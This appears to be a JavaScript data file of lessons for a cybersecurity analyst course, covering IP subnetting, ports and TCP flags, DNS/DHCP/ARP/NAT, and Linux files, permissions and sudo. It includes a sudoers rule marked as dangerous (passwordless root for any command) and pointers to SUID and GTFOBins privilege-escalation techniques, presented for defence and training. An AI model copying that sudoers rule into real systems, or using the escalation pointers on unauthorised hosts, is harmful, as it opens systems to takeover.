  html: `<p>Subnetting looks like math homework, but it is a daily analyst skill: "Is 10.20.37.200 inside the 10.20.32.0/21 server range?" "Does this firewall rule for 172.16.0.0/12 cover that host?" "How many machines could be in this /24 the attacker scanned?" Once you know the block-size method below, you can answer these in seconds without a calculator.</p>

<h3>Addresses and masks</h3>
<p>An IPv4 address is 32 bits written as four decimal octets: <code>192.168.10.77</code>. A <b>subnet mask</b> marks which bits identify the <b>network</b> (1s) and which identify the <b>host</b> (0s). <b>CIDR notation</b> (RFC 4632) just counts the network bits: <code>/24</code> = 24 ones = <code>255.255.255.0</code>.</p>
<table>
<tr><th>CIDR</th><th>Mask</th><th>Block size (in octet)</th><th>Usable hosts</th></tr>
<tr><td>/24</td><td>255.255.255.0</td><td>256</td><td>254</td></tr>
<tr><td>/25</td><td>255.255.255.128</td><td>128</td><td>126</td></tr>
<tr><td>/26</td><td>255.255.255.192</td><td>64</td><td>62</td></tr>
<tr><td>/27</td><td>255.255.255.224</td><td>32</td><td>30</td></tr>
<tr><td>/28</td><td>255.255.255.240</td><td>16</td><td>14</td></tr>
<tr><td>/29</td><td>255.255.255.248</td><td>8</td><td>6</td></tr>
<tr><td>/30</td><td>255.255.255.252</td><td>4</td><td>2</td></tr>
<tr><td>/16</td><td>255.255.0.0</td><td>1 (in 2nd octet)</td><td>65,534</td></tr>
<tr><td>/21</td><td>255.255.248.0</td><td>8 (in 3rd octet)</td><td>2,046</td></tr>
</table>
<p>Formula: usable hosts = 2<sup>h</sup> − 2, where h = 32 − prefix length. We subtract two because the first address is the <b>network address</b> and the last is the <b>broadcast address</b>. (Exceptions: /31 point-to-point links per RFC 3021 use both, and /32 is a single host.)</p>

<h3>The block-size method</h3>
<ol>
<li>Find the "interesting" octet — the one where the mask is not 255 or 0.</li>
<li>Block size = 256 − mask value in that octet.</li>
<li>Subnets start at multiples of the block size. Find the multiple at or just below the address — that is the network address.</li>
<li>Broadcast = next network address − 1. Usable range is everything in between.</li>
</ol>

<h4>Worked example 1: 192.168.10.77/26</h4>
<pre><code>Mask /26 = 255.255.255.192   interesting octet = 4th
Block size = 256 - 192 = 64  -&gt; subnets start at .0, .64, .128, .192
77 falls in the .64 block
Network:   192.168.10.64
Broadcast: 192.168.10.127   (next block .128 minus 1)
Usable:    192.168.10.65 - 192.168.10.126   (62 hosts)</code></pre>

<h4>Worked example 2: is 10.20.37.200 in 10.20.32.0/21?</h4>
<pre><code>Mask /21 = 255.255.248.0     interesting octet = 3rd
Block size = 256 - 248 = 8   -&gt; 3rd-octet blocks: 0, 8, 16, 24, 32, 40 ...
37 falls in the 32 block
Network:   10.20.32.0
Broadcast: 10.20.39.255
Usable:    10.20.32.1 - 10.20.39.254   (2^11 - 2 = 2,046 hosts)
Answer: YES, 10.20.37.200 is inside 10.20.32.0/21</code></pre>

<h4>Worked example 3: split 172.16.5.0/24 into 6 subnets</h4>
<pre><code>Need 6 subnets -&gt; borrow 3 bits (2^3 = 8 &gt;= 6) -&gt; /27
Block size 32; each subnet has 30 usable hosts
172.16.5.0/27, .32/27, .64/27, .96/27, .128/27, .160/27, (.192/27, .224/27 spare)</code></pre>
<div class="callout tip">Memorize the sequence 128, 192, 224, 240, 248, 252, 254, 255 (masks) and 128, 64, 32, 16, 8, 4, 2, 1 (block sizes). Everything else follows.</div>

<h3>Special and private ranges</h3>
<table>
<tr><th>Range</th><th>Purpose</th><th>Standard</th></tr>
<tr><td>10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16</td><td>Private (not routed on the internet)</td><td>RFC 1918</td></tr>
<tr><td>127.0.0.0/8</td><td>Loopback (localhost)</td><td>RFC 1122</td></tr>
<tr><td>169.254.0.0/16</td><td>Link-local / APIPA — host failed to get DHCP</td><td>RFC 3927</td></tr>
<tr><td>100.64.0.0/10</td><td>Carrier-grade NAT shared space</td><td>RFC 6598</td></tr>
<tr><td>224.0.0.0/4</td><td>Multicast</td><td>RFC 5771</td></tr>
</table>
<p>Note that 172.16.0.0/12 runs from 172.16.0.0 to <b>172.31.255.255</b> — so 172.32.1.1 is a <i>public</i> address. Analysts misjudge this all the time.</p>
<div class="callout real"><b>On the job:</b> an alert shows outbound traffic to 172.20.4.9. Private, so internal-to-internal (possible lateral movement). Another shows 172.40.4.9 — that is a public IP and needs threat-intel enrichment. Getting this wrong sends an investigation in the wrong direction.</div>

<h3>IPv6 in five minutes</h3>
<p>IPv6 (RFC 8200) uses 128-bit addresses written as eight groups of four hex digits: <code>2001:0db8:0000:0000:0000:ff00:0042:8329</code>. Leading zeros in a group may be dropped and one run of all-zero groups may be replaced with <code>::</code>, giving <code>2001:db8::ff00:42:8329</code>. Key points:</p>
<ul>
<li>Standard subnet size is /64; there is no broadcast (multicast replaces it) and NAT is rarely needed.</li>
<li><code>::1</code> is loopback; <code>fe80::/10</code> is link-local; <code>fc00::/7</code> is unique-local (like private); <code>2000::/3</code> is global unicast; <code>2001:db8::/32</code> is reserved for documentation.</li>
<li>Hosts can self-configure with SLAAC using Router Advertisements — and attackers can send rogue RAs. Many networks have IPv6 enabled by default even when nobody monitors it, a classic blind spot.</li>
</ul>
<div class="callout exam"><b>Exam mapping:</b> Network+ N10-009 objective 1.7 "Given a scenario, use appropriate IPv4 network addressing" (subnetting, CIDR, RFC 1918, APIPA, loopback) and 1.8 for IPv6 concepts. Expect "how many usable hosts" and "which subnet contains this address" questions.</div>`,
  keyTerms: [
    ["Subnet mask", "32-bit value marking network bits (1s) and host bits (0s)"],
    ["CIDR", "Classless Inter-Domain Routing; prefix notation like /24"],
    ["Network address", "First address in a subnet; identifies the subnet itself"],
    ["Broadcast address", "Last address in an IPv4 subnet; reaches all hosts on it"],
    ["Block size", "256 minus the mask value in the interesting octet; subnet increment"],
    ["RFC 1918", "Private IPv4 ranges: 10/8, 172.16/12, 192.168/16"],
    ["APIPA", "169.254.0.0/16 self-assigned address when DHCP fails"],
    ["IPv6", "128-bit addressing in hex; standard /64 subnets, no broadcast"],
    ["SLAAC", "IPv6 Stateless Address Autoconfiguration using router advertisements"]
  ],
  standards: ["RFC 791", "RFC 1918", "RFC 4632", "RFC 3927", "RFC 6598", "RFC 8200", "RFC 3021"],
  labs: ["lab-subnet"]
},
{
  id: "p0-m2-l3",
  module: "p0-m2",
  title: "TCP, UDP, Ports and the Protocols You Must Know",
  minutes: 20,
  objectives: [
    "Explain the TCP three-way handshake and the role of TCP flags",
    "Contrast TCP and UDP and give examples of each",
    "Recall the common port numbers and their secure alternatives",
    "View listening ports and connections on Linux and Windows"
  ],
  html: `<p>An IP address gets traffic to a machine; a <b>port number</b> gets it to the right program on that machine. Ports are 16-bit numbers (0–65535). Well-known ports are 0–1023, registered ports 1024–49151, and dynamic/ephemeral ports 49152–65535 (the IANA ranges, RFC 6335) are picked by clients for the source side of a connection. Knowing ports cold is non-negotiable for an analyst: firewall rules, scan results, alerts and netflow are all expressed in ports.</p>

<h3>TCP: reliable and connection-oriented</h3>
<p>TCP (RFC 9293) guarantees ordered, reliable delivery using sequence numbers, acknowledgments and retransmission. Every connection begins with the <b>three-way handshake</b>:</p>
<pre><code>Client                         Server (port 443)
  | ---- SYN  seq=1000 -----------&gt; |
  | &lt;--- SYN-ACK seq=5000 ack=1001  |
  | ---- ACK  ack=5001 -----------&gt; |   connection ESTABLISHED</code></pre>
<p>TCP flags you will see in packet captures and firewall logs:</p>
<table>
<tr><th>Flag</th><th>Meaning</th><th>Security angle</th></tr>
<tr><td>SYN</td><td>Start a connection</td><td>Many SYNs, no ACKs = SYN flood or SYN (half-open) scan</td></tr>
<tr><td>ACK</td><td>Acknowledges data</td><td>Set on almost every packet after the handshake</td></tr>
<tr><td>FIN</td><td>Graceful close</td><td>FIN/NULL/Xmas scans abuse odd flag combinations</td></tr>
<tr><td>RST</td><td>Abort / port closed</td><td>A closed port answers SYN with RST; floods of RST can indicate scanning</td></tr>
<tr><td>PSH, URG</td><td>Push data now / urgent</td><td>Xmas scan sets FIN+PSH+URG</td></tr>
</table>

<h3>UDP: fast and connectionless</h3>
<p>UDP (RFC 768) just sends datagrams with no handshake, no ordering and no retransmission. It suits DNS queries, VoIP, video, gaming, DHCP and QUIC. Because there is no handshake, UDP source addresses are easy to spoof, which enables <b>reflection/amplification DDoS</b>: an attacker sends small spoofed queries to open DNS, NTP or memcached servers that send large replies to the victim.</p>

<h3>Common ports table</h3>
<table>
<tr><th>Port</th><th>Proto</th><th>Service</th><th>Notes / secure alternative</th></tr>
<tr><td>20, 21</td><td>TCP</td><td>FTP data/control</td><td>Cleartext; use SFTP (22) or FTPS (990)</td></tr>
<tr><td>22</td><td>TCP</td><td>SSH, SFTP, SCP</td><td>Encrypted remote shell; brute-force target</td></tr>
<tr><td>23</td><td>TCP</td><td>Telnet</td><td>Cleartext — replace with SSH</td></tr>
<tr><td>25</td><td>TCP</td><td>SMTP (server to server)</td><td>587 (STARTTLS) / 465 (implicit TLS) for client submission</td></tr>
<tr><td>53</td><td>UDP/TCP</td><td>DNS</td><td>TCP for zone transfers and large replies; DoT 853, DoH 443</td></tr>
<tr><td>67, 68</td><td>UDP</td><td>DHCP server, client</td><td>Rogue DHCP servers are an attack</td></tr>
<tr><td>69</td><td>UDP</td><td>TFTP</td><td>No authentication at all</td></tr>
<tr><td>80</td><td>TCP</td><td>HTTP</td><td>Redirect to 443</td></tr>
<tr><td>88</td><td>TCP/UDP</td><td>Kerberos</td><td>AD authentication</td></tr>
<tr><td>110 / 995</td><td>TCP</td><td>POP3 / POP3S</td><td></td></tr>
<tr><td>123</td><td>UDP</td><td>NTP</td><td>Accurate time is vital for log correlation</td></tr>
<tr><td>135, 137–139</td><td>TCP/UDP</td><td>MS RPC, NetBIOS</td><td>Never expose to the internet</td></tr>
<tr><td>143 / 993</td><td>TCP</td><td>IMAP / IMAPS</td><td></td></tr>
<tr><td>161, 162</td><td>UDP</td><td>SNMP, SNMP traps</td><td>Use SNMPv3; v1/v2c community strings are cleartext</td></tr>
<tr><td>389 / 636</td><td>TCP</td><td>LDAP / LDAPS</td><td>Directory queries; prefer LDAPS or signing</td></tr>
<tr><td>443</td><td>TCP/UDP</td><td>HTTPS (TLS); HTTP/3 over QUIC on UDP</td><td></td></tr>
<tr><td>445</td><td>TCP</td><td>SMB</td><td>File sharing; WannaCry spread over it — block at the perimeter</td></tr>
<tr><td>514 / 6514</td><td>UDP / TCP</td><td>Syslog / Syslog over TLS</td><td></td></tr>
<tr><td>1433 / 3306 / 5432</td><td>TCP</td><td>MS SQL / MySQL / PostgreSQL</td><td>Databases should not face the internet</td></tr>
<tr><td>3389</td><td>TCP/UDP</td><td>RDP</td><td>Top ransomware entry point when exposed; put behind VPN/ZTNA with MFA</td></tr>
<tr><td>5985 / 5986</td><td>TCP</td><td>WinRM HTTP / HTTPS</td><td>PowerShell remoting; lateral movement</td></tr>
</table>
<div class="callout warn">Ports are a convention, not a law. Malware can run a C2 channel on TCP 443 without TLS, or SSH on 8443. Always confirm what protocol is actually in use rather than trusting the number.</div>

<h3>Seeing ports on a host</h3>
<pre><code># Linux: listening TCP/UDP sockets with owning process (ss replaces netstat)
$ sudo ss -tulpn
Netid State  Local Address:Port  Process
tcp   LISTEN 0.0.0.0:22          users:(("sshd",pid=812,fd=3))
tcp   LISTEN 127.0.0.1:5432      users:(("postgres",pid=990,fd=6))

# Windows (cmd): connections with PIDs
C:\\&gt; netstat -ano | findstr LISTENING

# Windows PowerShell: established connections and owning process
PS&gt; Get-NetTCPConnection -State Established |
      Select-Object LocalPort,RemoteAddress,RemotePort,OwningProcess</code></pre>
<p>Notice <code>0.0.0.0:22</code> listens on every interface, while <code>127.0.0.1:5432</code> is reachable only from the machine itself. That difference decides whether a service is exposed.</p>
<div class="callout real"><b>On the job:</b> during triage you may see a workstation with an ESTABLISHED connection on TCP 4444 to an unknown external IP. 4444 is Metasploit's default listener port — a strong hint of a reverse shell. Map the PID to a process, then the process to its parent.</div>
<div class="callout exam"><b>Exam mapping:</b> Network+ N10-009 objective 1.4 "Explain common networking ports, protocols, services and traffic types". Security+ SY0-701 objective 4.5 asks you to choose secure protocols (SSH over Telnet, SFTP over FTP, LDAPS, SNMPv3, DNSSEC).</div>`,
  keyTerms: [
    ["Port", "16-bit number identifying a service/application on a host"],
    ["Ephemeral port", "Short-lived client source port, IANA range 49152–65535"],
    ["Three-way handshake", "SYN, SYN-ACK, ACK sequence that opens a TCP connection"],
    ["TCP", "Reliable, ordered, connection-oriented transport protocol"],
    ["UDP", "Connectionless, best-effort transport protocol"],
    ["RST", "TCP flag that aborts a connection; a closed port's reply to SYN"],
    ["Amplification attack", "DDoS using spoofed small requests that trigger large replies to a victim"],
    ["Socket", "Combination of IP address, port and protocol identifying one endpoint"]
  ],
  standards: ["RFC 9293", "RFC 768", "RFC 6335"],
  labs: ["lab-ports"]
},
{
  id: "p0-m2-l4",
  module: "p0-m2",
  title: "DNS, DHCP, ARP, NAT and Essential Network Tools",
  minutes: 20,
  objectives: [
    "Trace how DNS resolves a name and recognize key record types",
    "Explain DHCP's DORA process and ARP's role on a LAN",
    "Describe NAT/PAT and its effect on investigations",
    "Use ping, traceroute, dig/nslookup and tcpdump for basic diagnostics"
  ],
  html: `<p>Four quiet protocols make every network usable: DNS turns names into addresses, DHCP hands out addresses, ARP finds the hardware address of a neighbor, and NAT lets thousands of private devices share a public IP. Each is also a favorite attack surface — and a rich source of evidence.</p>

<h3>DNS: the internet's phone book</h3>
<p>When you browse to <code>www.example.com</code>, your computer asks a <b>recursive resolver</b> (your ISP's, your company's, or a public one like 1.1.1.1 or 8.8.8.8). If the answer is not cached, the resolver asks a <b>root server</b> (which refers it to the <code>.com</code> TLD servers), then the TLD servers (which refer it to example.com's <b>authoritative</b> servers), which give the final answer. Answers are cached for their <b>TTL</b>.</p>
<table>
<tr><th>Record</th><th>Purpose</th></tr>
<tr><td>A / AAAA</td><td>Name → IPv4 / IPv6 address</td></tr>
<tr><td>CNAME</td><td>Alias pointing to another name</td></tr>
<tr><td>MX</td><td>Mail servers for a domain</td></tr>
<tr><td>TXT</td><td>Free text — holds SPF, DKIM and DMARC email-authentication policies and domain verification tokens</td></tr>
<tr><td>NS</td><td>Authoritative name servers for a zone</td></tr>
<tr><td>PTR</td><td>Reverse lookup: IP → name</td></tr>
<tr><td>SOA</td><td>Zone metadata (primary server, serial number)</td></tr>
</table>
<pre><code>$ dig +short A example.com
$ dig MX example.com
$ dig -x 8.8.8.8 +short          # reverse lookup
C:\\&gt; nslookup -type=TXT example.com</code></pre>
<p>Security relevance: DNS logs show nearly every connection a host intends to make, so they are gold for detection. Attackers use <b>DNS tunneling</b> (data hidden in long subdomain queries), <b>domain generation algorithms</b> (DGAs), newly registered look-alike domains, and <b>cache poisoning</b>. <b>DNSSEC</b> (RFC 4033–4035) signs records for integrity; <b>DNS over HTTPS</b> (RFC 8484) and <b>DNS over TLS</b> (RFC 7858) encrypt queries for privacy — which can also blind corporate DNS monitoring if users bypass the company resolver.</p>

<h3>DHCP: automatic addressing</h3>
<p>DHCP (RFC 2131) gives a client its IP, subnet mask, default gateway and DNS servers through the <b>DORA</b> exchange over UDP 67/68:</p>
<ol>
<li><b>Discover</b> — client broadcasts "any DHCP servers?"</li>
<li><b>Offer</b> — server offers an address</li>
<li><b>Request</b> — client requests that address</li>
<li><b>Acknowledge</b> — server confirms the <b>lease</b></li>
</ol>
<p>DHCP logs map IP addresses to MAC addresses and hostnames over time. When an alert says "10.1.4.77 contacted a malicious domain at 14:02", the DHCP lease log tells you <i>which laptop</i> had that address at 14:02. Rogue DHCP servers (which hand out an attacker's gateway or DNS) are blocked by switch <b>DHCP snooping</b>.</p>

<h3>ARP: finding neighbors</h3>
<p>To send a frame to another host on the same subnet (or to the default gateway), a host needs its MAC address. ARP (RFC 826) broadcasts "who has 192.168.1.1?" and the owner replies with its MAC. ARP has no authentication, so an attacker can send forged replies claiming to be the gateway — <b>ARP spoofing/poisoning</b> — and become an on-path (man-in-the-middle) attacker. Defenses include Dynamic ARP Inspection on switches and, above all, encrypting traffic (TLS) so interception yields nothing useful.</p>
<pre><code>$ ip neigh          # Linux ARP/neighbor cache
C:\\&gt; arp -a        # Windows ARP cache
# Two different IPs with the same MAC (one being the gateway) can indicate ARP spoofing</code></pre>

<h3>NAT and PAT</h3>
<p><b>Network Address Translation</b> rewrites private source addresses to a public one at the edge router or firewall. The common form, <b>PAT</b> (port address translation, "NAT overload"), maps many internal hosts to one public IP using different source ports. Consequences for investigators: an external victim reports an attack from your public IP — to find the internal culprit you need the firewall's NAT translation logs with the exact timestamp and source port. Accurate time synchronization (NTP) across devices is what makes that correlation possible.</p>

<h3>Essential diagnostic tools</h3>
<table>
<tr><th>Tool</th><th>What it tells you</th></tr>
<tr><td><code>ping</code></td><td>Reachability and round-trip time using ICMP echo (often blocked by firewalls, so no reply ≠ down)</td></tr>
<tr><td><code>traceroute</code> / <code>tracert</code></td><td>The router hops to a destination (via TTL expiry)</td></tr>
<tr><td><code>ip addr</code> / <code>ipconfig /all</code></td><td>Your IP, mask, gateway, DNS servers, MAC, DHCP lease</td></tr>
<tr><td><code>ip route</code> / <code>route print</code></td><td>The routing table</td></tr>
<tr><td><code>dig</code> / <code>nslookup</code></td><td>DNS lookups</td></tr>
<tr><td><code>curl -v</code></td><td>Raw HTTP(S) request/response and TLS details</td></tr>
<tr><td><code>tcpdump</code> / Wireshark</td><td>Packet capture and analysis</td></tr>
<tr><td><code>nmap</code></td><td>Port/service discovery (authorized targets only)</td></tr>
</table>
<pre><code># Capture DNS traffic on eth0 without resolving names, write to a file
$ sudo tcpdump -i eth0 -nn port 53 -w dns.pcap
# Show only SYN packets (new connection attempts)
$ sudo tcpdump -nn 'tcp[tcpflags] &amp; tcp-syn != 0 and tcp[tcpflags] &amp; tcp-ack == 0'</code></pre>
<div class="callout real"><b>On the job:</b> a user "can't reach anything". <code>ipconfig</code> shows 169.254.x.x — DHCP failed, so it is not a security incident (probably). A user whose DNS server is suddenly an unknown external IP, however, might be the victim of DNS-changing malware or a rogue DHCP server.</div>
<div class="callout exam"><b>Exam mapping:</b> Network+ N10-009 objective 3.4 covers DHCP, DNS and NTP services; Domain 5.0 Network Troubleshooting covers ping, traceroute, nslookup/dig, tcpdump and nmap. Security+ SY0-701 objective 2.4 covers DNS and on-path attacks.</div>`,
  keyTerms: [
    ["Recursive resolver", "DNS server that resolves names on a client's behalf and caches results"],
    ["Authoritative server", "DNS server holding the official records for a zone"],
    ["TTL", "Time to live: how long a DNS answer may be cached (also an IP hop counter)"],
    ["DORA", "DHCP Discover, Offer, Request, Acknowledge"],
    ["ARP spoofing", "Forged ARP replies that redirect LAN traffic through an attacker"],
    ["PAT", "Port Address Translation: many private hosts share one public IP via ports"],
    ["DNSSEC", "Digital signatures on DNS records for integrity and authenticity"],
    ["DNS tunneling", "Hiding data or C2 traffic inside DNS queries and responses"],
    ["DHCP snooping", "Switch feature that blocks DHCP offers from untrusted ports"]
  ],
  standards: ["RFC 1034", "RFC 1035", "RFC 2131", "RFC 826", "RFC 8484", "RFC 7858", "RFC 4033"],
  labs: ["lab-ports"]
}
);

// ===================== p0-m3 Linux Command Line =====================
CP.lessons.push(
{
  id: "p0-m3-l1",
  module: "p0-m3",
  title: "The Linux File System and Moving Around the Shell",
  minutes: 15,
  objectives: [
    "Navigate the file system with pwd, ls, cd and tab completion",
    "Explain the Filesystem Hierarchy Standard and where logs and configs live",
    "Create, copy, move, view and delete files safely",
    "Read the security-relevant files /etc/passwd, /etc/shadow and /var/log"
  ],
  html: `<p>Most servers on the internet, most cloud workloads, most security tools (Zeek, Suricata, Wazuh, Elastic, Splunk forwarders) and most firewalls and appliances run Linux. As an analyst you will SSH into a box, look around, find logs and pull out evidence — all from a text terminal. This module makes that comfortable.</p>

<h3>The shell and the prompt</h3>
<p>The <b>shell</b> (usually <code>bash</code> or <code>zsh</code>) reads commands and runs them. A typical prompt looks like <code>analyst@web01:~$</code>: user <i>analyst</i>, host <i>web01</i>, current directory <code>~</code> (your home), and <code>$</code> meaning a normal user (<code>#</code> means root). Commands follow the pattern <code>command -options arguments</code>.</p>
<pre><code>$ pwd                 # print working directory
/home/analyst
$ ls -la              # long listing including hidden (dot) files
$ cd /var/log         # absolute path (starts with /)
$ cd ..               # up one directory
$ cd -                # back to the previous directory
$ man ls              # the manual; press q to quit
$ history | tail -20  # your recent commands</code></pre>
<div class="callout tip">Press <b>Tab</b> to auto-complete file names and commands, and the <b>Up arrow</b> to recall previous commands. <b>Ctrl+C</b> stops a running command, <b>Ctrl+R</b> searches your history. These save hours.</div>

<h3>Everything is a file: the Filesystem Hierarchy Standard</h3>
<p>Linux has a single tree rooted at <code>/</code>. There are no drive letters; disks are <b>mounted</b> into the tree. The FHS defines where things go:</p>
<table>
<tr><th>Path</th><th>Contents</th><th>Why an analyst cares</th></tr>
<tr><td><code>/etc</code></td><td>System configuration</td><td><code>passwd</code>, <code>shadow</code>, <code>sudoers</code>, <code>ssh/sshd_config</code>, <code>crontab</code>, <code>hosts</code></td></tr>
<tr><td><code>/var/log</code></td><td>Logs</td><td><code>auth.log</code> (Debian/Ubuntu) or <code>secure</code> (RHEL), <code>syslog</code>/<code>messages</code>, web server logs</td></tr>
<tr><td><code>/home</code>, <code>/root</code></td><td>User home directories</td><td><code>.bash_history</code>, <code>.ssh/authorized_keys</code> (persistence!)</td></tr>
<tr><td><code>/tmp</code>, <code>/var/tmp</code>, <code>/dev/shm</code></td><td>World-writable temp space</td><td>Favorite place for attackers to drop tools</td></tr>
<tr><td><code>/bin</code>, <code>/usr/bin</code>, <code>/sbin</code></td><td>Programs</td><td>Replaced binaries can indicate a rootkit</td></tr>
<tr><td><code>/proc</code></td><td>Virtual files describing running processes</td><td><code>/proc/&lt;PID&gt;/cmdline</code>, <code>/proc/&lt;PID&gt;/exe</code></td></tr>
<tr><td><code>/opt</code>, <code>/srv</code>, <code>/var/www</code></td><td>Add-on software, served data, web roots</td><td>Web shells hide in web roots</td></tr>
</table>

<h3>Working with files</h3>
<pre><code>$ mkdir -p ~/cases/IR-1042         # make directory (and parents)
$ cp /var/log/auth.log ~/cases/IR-1042/
$ mv notes.txt findings.txt        # move / rename
$ touch empty.txt                  # create empty file or update timestamp
$ rm findings.old                  # delete (no recycle bin!)
$ cat /etc/hostname                # print small file
$ less /var/log/syslog             # page through big file (/ to search, q to quit)
$ head -n 20 access.log            # first 20 lines
$ tail -f /var/log/auth.log        # follow a log live
$ file suspicious.bin              # identify type from magic bytes
$ sha256sum suspicious.bin         # hash it for threat intel lookups
$ wc -l access.log                 # count lines</code></pre>
<div class="callout warn"><code>rm -rf</code> deletes recursively without asking. On a live incident, never modify or delete evidence; copy logs to your case folder (or better, collect them with your forensic tooling) and work on the copies.</div>

<h3>Redirection and pipes</h3>
<p>The real power of the shell is chaining small tools. <code>&gt;</code> writes output to a file (overwriting), <code>&gt;&gt;</code> appends, <code>2&gt;</code> redirects errors, and <code>|</code> (pipe) feeds one command's output into the next.</p>
<pre><code>$ grep "Failed password" /var/log/auth.log | wc -l
$ find / -name "*.sh" 2&gt;/dev/null &gt; scripts.txt    # discard permission errors</code></pre>

<h3>Reading the account files</h3>
<p><code>/etc/passwd</code> is world-readable and lists accounts, seven colon-separated fields:</p>
<pre><code>analyst:x:1001:1001:SOC Analyst:/home/analyst:/bin/bash
 user   pw UID  GID  comment     home           shell</code></pre>
<p>The <code>x</code> means the password hash lives in <code>/etc/shadow</code>, readable only by root. Shadow hashes look like <code>$6$salt$hash</code> (SHA-512 crypt) or <code>$y$...</code> (yescrypt, the default on current Debian, Ubuntu and Fedora). Things to check during an investigation:</p>
<ul>
<li>Any account other than <code>root</code> with <b>UID 0</b> — it is a second root account: <code>awk -F: '$3 == 0' /etc/passwd</code></li>
<li>Service accounts (www-data, mysql) that suddenly have a real shell like <code>/bin/bash</code> instead of <code>/usr/sbin/nologin</code></li>
<li>Unexpected keys in <code>~/.ssh/authorized_keys</code></li>
</ul>
<div class="callout real"><b>On the job:</b> a common first five minutes on a suspect Linux host: <code>w</code> (who is logged in), <code>last -a | head</code> (recent logins), <code>sudo tail -100 /var/log/auth.log</code>, <code>ls -la /tmp /dev/shm</code>, <code>crontab -l</code> and <code>ls /etc/cron.*</code>. You will build on this throughout the module.</div>
<div class="callout exam"><b>Exam mapping:</b> A+ Core 2 (220-1102) objective 1.9 covers basic Linux commands (ls, pwd, mv, cp, rm, chmod, chown, su/sudo, apt/dnf, ip, df, grep, ps, man, top, find, cat, nano). Security+ SY0-701 objective 4.9 expects you to use log data, which on Linux means /var/log and the journal.</div>`,
  keyTerms: [
    ["Shell", "Command interpreter such as bash or zsh"],
    ["FHS", "Filesystem Hierarchy Standard defining where files belong on Linux"],
    ["Absolute path", "Path starting at the root, e.g. /var/log/auth.log"],
    ["Pipe", "The | operator sending one command's output to another's input"],
    ["Redirection", "Sending output to files with >, >> or 2>"],
    ["/etc/passwd", "World-readable list of accounts, UIDs, home directories and shells"],
    ["/etc/shadow", "Root-only file containing password hashes"],
    ["UID 0", "The superuser identity; any account with UID 0 is root-equivalent"]
  ],
  standards: ["Filesystem Hierarchy Standard 3.0"],
  labs: ["lab-linux-terminal"]
},
{
  id: "p0-m3-l2",
  module: "p0-m3",
  title: "Users, Groups, Permissions and sudo",
  minutes: 18,
  objectives: [
    "Read and set permissions with chmod in symbolic and octal form",
    "Change ownership with chown and explain umask",
    "Explain SUID, SGID and the sticky bit and why SUID is dangerous",
    "Use sudo safely and audit who can elevate privileges"
  ],
  html: `<p>Linux decides who can read, change or run each file using a simple but strict permission model. Most Linux privilege-escalation techniques you will read about — and most hardening findings you will write — come down to permissions that are too loose. Learn to read them at a glance.</p>

<h3>Reading a permission string</h3>
<pre><code>$ ls -l /etc/shadow /usr/bin/passwd deploy.sh
-rw-r-----  1 root   shadow  1432 Oct 19 09:12 /etc/shadow
-rwsr-xr-x  1 root   root   59976 Feb  6  2026 /usr/bin/passwd
-rwxr-x---  1 alice  devops   812 Oct 20 08:01 deploy.sh</code></pre>
<p>The first character is the type (<code>-</code> file, <code>d</code> directory, <code>l</code> symlink). Then three triplets: <b>user (owner)</b>, <b>group</b>, <b>other</b>. Each triplet is read (r), write (w), execute (x). For directories, r = list names, w = create/delete entries, x = enter/traverse.</p>

<h3>chmod: symbolic and octal</h3>
<p>Each permission has a value: r = 4, w = 2, x = 1. Add them per triplet:</p>
<table>
<tr><th>Octal</th><th>Symbolic</th><th>Typical use</th></tr>
<tr><td>755</td><td>rwxr-xr-x</td><td>Programs and directories everyone may use</td></tr>
<tr><td>644</td><td>rw-r--r--</td><td>Normal readable files</td></tr>
<tr><td>640</td><td>rw-r-----</td><td>Config readable by a service group</td></tr>
<tr><td>600</td><td>rw-------</td><td>Private keys, <code>~/.ssh/authorized_keys</code>, secrets</td></tr>
<tr><td>700</td><td>rwx------</td><td><code>~/.ssh</code> directory</td></tr>
<tr><td>777</td><td>rwxrwxrwx</td><td>Almost always a finding</td></tr>
</table>
<pre><code>$ chmod 600 ~/.ssh/id_ed25519       # octal
$ chmod u+x script.sh               # symbolic: add execute for owner
$ chmod go-rwx secrets.env          # remove all rights from group and other
$ chown www-data:www-data /var/www/app -R   # owner:group, recursively</code></pre>
<div class="callout warn">SSH refuses to use a private key or <code>authorized_keys</code> file that is group- or world-writable. If key login suddenly fails after someone ran <code>chmod -R 777</code>, that is why — and the 777 itself is a security incident waiting to happen.</div>

<h3>umask</h3>
<p>The <b>umask</b> removes permissions from newly created files. The common default <code>022</code> means new files get 644 and new directories 755. A stricter <code>027</code> yields 640/750 so "other" gets nothing — a typical CIS Benchmark recommendation.</p>

<h3>Special bits: SUID, SGID, sticky</h3>
<ul>
<li><b>SUID</b> (4000, shown as <code>s</code> in the owner's x slot): the program runs with the <i>file owner's</i> privileges. <code>/usr/bin/passwd</code> is SUID root so normal users can update <code>/etc/shadow</code>.</li>
<li><b>SGID</b> (2000): runs with the file's group; on a directory, new files inherit the directory's group.</li>
<li><b>Sticky bit</b> (1000, <code>t</code> on others' x): in a shared directory like <code>/tmp</code> (<code>drwxrwxrwt</code>), users can only delete their own files.</li>
</ul>
<p>An unexpected SUID-root binary — especially a copy of a shell or an interpreter like <code>python3</code> or <code>find</code> — gives any user root. Hunting for them is a standard check:</p>
<pre><code>$ find / -perm -4000 -type f 2&gt;/dev/null
$ find / -perm -2000 -type f 2&gt;/dev/null
# Compare against a known-good baseline; investigate anything in /tmp, /home or /dev/shm</code></pre>
<div class="callout tip">GTFOBins (gtfobins.github.io) lists how ordinary binaries can be abused when they are SUID or allowed in sudo. Defenders use it to judge how dangerous a misconfiguration really is.</div>

<h3>Users, groups and sudo</h3>
<pre><code>$ id                       # your UID, GID and groups
uid=1001(analyst) gid=1001(analyst) groups=1001(analyst),27(sudo)
$ sudo useradd -m -s /bin/bash jdoe
$ sudo usermod -aG docker jdoe     # -a append! without it you replace all groups
$ sudo passwd -l jdoe              # lock an account
$ sudo -l                          # what am I allowed to run with sudo?</code></pre>
<p><b>sudo</b> lets permitted users run commands as root (or another user) and logs each use — far better than sharing the root password (least privilege plus accountability). Rules live in <code>/etc/sudoers</code> and <code>/etc/sudoers.d/</code>; always edit with <code>visudo</code>, which checks syntax. Membership in <code>sudo</code> (Debian/Ubuntu) or <code>wheel</code> (RHEL) grants admin rights.</p>
<pre><code># Dangerous: lets jdoe run ANY command as root without a password
jdoe ALL=(ALL) NOPASSWD: ALL
# Better: one specific command
jdoe ALL=(root) /usr/bin/systemctl restart nginx</code></pre>
<div class="callout warn">Membership in the <code>docker</code> group or the <code>lxd</code> group is effectively root, because those users can start a container that mounts the host file system. Treat them as admin groups in access reviews.</div>
